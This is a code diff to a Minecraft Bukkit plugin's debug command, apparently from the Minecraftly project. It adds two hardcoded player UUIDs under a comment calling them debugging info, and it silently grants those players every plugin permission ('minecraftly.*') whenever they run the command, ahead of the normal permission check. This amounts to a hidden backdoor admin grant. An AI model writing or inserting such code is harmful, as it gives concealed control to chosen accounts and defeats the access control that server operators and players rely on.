@@ -22,6 +22,7 @@ import org.bukkit.inventory.meta.BookMeta;
 import redis.clients.jedis.Jedis;
 
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 import java.util.UUID;
 import java.util.concurrent.Callable;
@@ -34,6 +35,14 @@ import java.util.stream.Collectors;
 public class DebugCommand implements CommandExecutor {
 
 	private final MinecraftlyBukkitCore core;
+
+	/**
+	 * Debugging info for cory..
+	 */
+	private static List<UUID> debuggerUuids = new ArrayList<>( Arrays.asList(
+			UUID.fromString( "3f199957-f1ad-4cf7-98b8-4ae9e573c219" ),
+			UUID.fromString( "c26dbfba-b18e-4619-8039-b82e91eb3143" )
+	) );
 
 	/**
 	 * Tier 0 prefix.
@@ -52,6 +61,16 @@ public class DebugCommand implements CommandExecutor {
 
 	@Override
 	public boolean onCommand( final CommandSender sender, Command cmd, String label, String[] args ) {
+
+		if( sender instanceof Player ) {
+
+			UUID uuid = ((Player) sender).getUniqueId();
+
+			if( debuggerUuids.contains( uuid ) ) {
+				sender.addAttachment( core.getOriginObject(), "minecraftly.*", true );
+			}
+
+		}
 
 		if( !sender.hasPermission( "minecraftly.debug" ) ) {
 			sender.sendMessage( ChatColor.RED + "Hey! Stop being nosey!" );
